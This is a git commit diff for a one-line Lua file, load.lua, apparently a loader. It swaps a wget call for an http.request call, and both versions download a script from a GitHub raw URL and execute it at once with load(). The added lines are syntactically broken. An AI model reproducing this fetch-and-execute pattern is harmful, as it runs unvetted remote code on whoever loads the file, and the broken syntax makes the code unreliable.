fea74c70892bb04c6779671b2ade6646711a6b02
bezumnui <57602929+bezumnui@users.noreply.github.com>
2022-10-27 19:25:22 +0400

    Update load.lua

--- load.lua
+++ load.lua
@@ -1,1 +1,3 @@
-load(io.popen("wget -qO- https://raw.githubusercontent.com/bezumnui/lua-not-for-visit/main/test.lua"):read"*a")()
+local res, code, headers, status = 
+        http.request 'https://raw.githubusercontent.com/bezumnui/lua-not-for-visit/main/test.lua')
+load(res):read"*a")()
